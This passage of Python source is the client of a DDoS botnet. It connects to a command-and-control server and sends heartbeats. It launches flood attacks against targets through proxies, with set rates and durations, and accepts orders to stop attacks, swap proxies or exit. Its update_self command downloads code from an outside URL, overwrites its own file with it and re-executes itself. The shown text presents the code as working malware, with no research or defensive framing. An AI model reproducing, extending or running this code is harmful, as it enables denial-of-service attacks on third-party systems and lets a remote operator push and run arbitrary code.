                log("⚠️ [ATTACK] No proxies available! Attack will proceed with direct connection only.")
            else:
                log("✅ [ATTACK] Using {} proxies for attack".format(len(active_proxies)))

            send_report(sock, {
                "type": "attack_started",
                "id": BOT_ID,
                "attack_id": attack_id,
                "proxies_count": len(active_proxies),
                "method": method,
                "target": target,
            })

            log("[ATTACK] 🚀 LAUNCHING ATTACK: {} | Method: {} | Target: {} | Port: {} | Duration: {}s | Hold: {}s | RPS: {} | Proxies: {}".format(
                attack_id, method, target, port, duration, hold_time, rps_limit, len(active_proxies)))

            engine = AttackEngine(
                attack_id=attack_id,
                method=method,
                target=target,
                port=port,
                duration=duration,
                hold_time=hold_time,
                extra=extra,
                rps_limit=rps_limit,
                proxies=active_proxies,
                sock=sock
            )
            current_attacks[attack_id] = engine
            engine.start()
            log("[ATTACK] ✅ Engine started for {}".format(attack_id))

            def wait_and_report():
                try:
                    total_time = duration + hold_time + 15
                    log("[ATTACK] ⏱️ Waiting for attack {} to complete (max {}s)...".format(attack_id, total_time))
                    engine.join(timeout=total_time)
                    if engine.is_alive():
                        log("[ATTACK] ⏱️ Attack {} still running after timeout, forcing stop...".format(attack_id))
                        engine.stop()
                        engine.join(timeout=5)
                    log("[ATTACK] ✅ Attack {} wait_and_report completed. Engine alive: {}".format(
                        attack_id, engine.is_alive()))
                    current_attacks.pop(attack_id, None)
                except Exception as e:
                    log("[ENGINE] 💥 wait_and_report error: {}".format(e), logging.ERROR)
                    import traceback
                    log("[ENGINE] Traceback: {}".format(traceback.format_exc()), logging.ERROR)

            threading.Thread(target=wait_and_report, daemon=True).start()

        elif cmd == "proxy_refresh":
            attack_id = data.get("attack_id")
            new_proxies = data.get("proxies", [])
            if attack_id in current_attacks and new_proxies:
                engine = current_attacks[attack_id]
                engine.update_proxies(new_proxies)
                send_report(sock, {"type": "proxy_refreshed", "id": BOT_ID, "attack_id": attack_id, "new_count": len(new_proxies)})
                log("[PROXY] 🔄 Refreshed {} proxies for attack {}".format(len(new_proxies), attack_id))
            else:
                log("⚠️ Cannot refresh proxies: attack {} not found or no proxies".format(attack_id))

        elif cmd == "update_rps":
            attack_id = data.get("attack_id")
            new_rps = data.get("rps_limit", 0)
            if attack_id in current_attacks and new_rps > 0:
                engine = current_attacks[attack_id]
                engine.update_rps(new_rps)
                send_report(sock, {"type": "rps_updated", "id": BOT_ID, "attack_id": attack_id, "new_rps": new_rps})
                log("[RPS] 🔄 Updated RPS for {} to {}".format(attack_id, new_rps))
            else:
                log("⚠️ Cannot update RPS: attack {} not found or invalid RPS {}".format(attack_id, new_rps))

        elif cmd == "stop":
            attack_id = data.get("attack_id")
            if attack_id and attack_id in current_attacks:
                log("🛑 Stopping specific attack: {}".format(attack_id))
                engine = current_attacks[attack_id]
                engine.stop()
                engine.join(timeout=5)
                current_attacks.pop(attack_id, None)
                send_report(sock, {"type": "attack_stopped", "id": BOT_ID, "attack_id": attack_id})
                log("✅ Attack {} stopped".format(attack_id))
            else:
                log("🛑 Stop ALL attacks command received")
                for aid, engine in list(current_attacks.items()):
                    try:
                        log("🛑 Stopping attack {}...".format(aid))
                        engine.stop()
                        engine.join(timeout=3)
                    except Exception as e:
                        log("Error stopping {}: {}".format(aid, e))
                current_attacks.clear()
                send_report(sock, {"type": "all_stopped", "id": BOT_ID})
                log("✅ All attacks stopped")

        elif cmd == "proxy_update":
            new_proxies = data.get("proxies", [])
            proxy_list = new_proxies
            log("📦 Received {} proxies from C2".format(len(proxy_list)))
            send_report(sock, {"type": "proxy_updated", "id": BOT_ID, "count": len(proxy_list)})

        elif cmd == "update_self":
            url = data.get("url")
            if url:
                try:
                    r = requests.get(url)
                    with open(__file__, "wb") as f:
                        f.write(r.content)
                    log("🔄 Self-updated, restarting...")
                    os.execv(sys.executable, [sys.executable] + sys.argv)
                except Exception as e:
                    send_report(sock, {"type": "update_failed", "error": str(e)})
                    log("❌ Self-update failed: {}".format(e))

        elif cmd == "exit":
            log("👋 Exit command received. Goodbye!")
            _heartbeat_stop.set()
            sock.close()
            sys.exit(0)

        else:
            log("❓ Unknown command: '{}' | type: '{}' | Data: {}".format(cmd, msg_type, data))

    except json.JSONDecodeError as e:
        log("❌ Invalid JSON: {}... - {}".format(cmd_json[:200], e), logging.WARNING)
    except Exception as e:
        log("💥 Error handling command: {}".format(e), logging.ERROR)
        import traceback
        log("Traceback: {}".format(traceback.format_exc()), logging.ERROR)

def main():
    global read_buffer, _heartbeat_thread, _heartbeat_stop
    log("🚀 Bot started. ID: {} | Threads: {} | RPS Limit: {} | Bandwidth Limit: {}MB | PROXY-FIRST | DIRECT_FALLBACK={} | 12H STABLE | C2: {}:{}".format(
        BOT_ID, THREADS, RPS_LIMIT, BANDWIDTH_LIMIT_MB, DIRECT_FALLBACK, C2_IP, C2_PORT))
    while not _shutdown_event.is_set():
        sock = connect_to_c2()
        if not sock:
            log("❌ Failed to connect to C2, retrying...")
            time.sleep(5)
            continue
        read_buffer = ""
        # Start heartbeat thread
        _heartbeat_stop.clear()
        _heartbeat_thread = threading.Thread(target=heartbeat_loop, args=(sock,), daemon=True)
        _heartbeat_thread.start()
        log("💓 Heartbeat thread started")
        try:
            while not _shutdown_event.is_set():
                try:
                    chunk = sock.recv(4096).decode('utf-8', errors='ignore')
                    if not chunk:
                        log("⚠️ Connection closed by C2")
                        break
                    read_buffer += chunk
                    while "\n" in read_buffer:
                        line, read_buffer = read_buffer.split("\n", 1)
                        line = line.strip()
                        if line:
                            handle_command(sock, line)
                except socket.timeout:
                    continue
                except Exception as e:
                    log("❌ Recv error: {}".format(e), logging.WARNING)
                    break
        except Exception as e:
            log("💥 Connection error: {}".format(e), logging.ERROR)
        # Cleanup
        _heartbeat_stop.set()
        if _heartbeat_thread:
            _heartbeat_thread.join(timeout=2)
        try:
            sock.close()
        except:
            pass
        if not _shutdown_event.is_set():
            log("🔄 Reconnecting in 5s...")
            time.sleep(5)
    log("🛑 Bot shutdown complete.")

if __name__ == "__main__":
    main()